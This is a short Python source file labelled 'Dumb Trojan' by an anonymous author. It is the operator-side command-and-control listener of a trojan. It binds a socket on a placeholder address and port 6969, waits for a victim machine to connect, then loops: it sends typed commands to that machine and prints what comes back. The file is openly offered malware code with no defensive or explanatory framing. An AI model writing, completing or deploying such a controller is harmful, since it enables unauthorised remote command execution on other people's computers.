# ----------------------------------------------------------------------------------------------
# Dumb Trojan
#
# Simple Python3 trojan
# 
#
# author : Anonymous , version 1.0
# ----------------------------------------------------------------------------------------------

import socket

HOST = '192.168.xx.xxx' #ifconfig
PORT = 6969

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))

server.listen()

client, adress = server.accept()

while True:

    print(f"Connected to {adress}")
    cmd_input = input("Enter a command: ")
    client.send(cmd_input.encode('utf-8'))
    print(client.recv(1024).decode('utf-8'))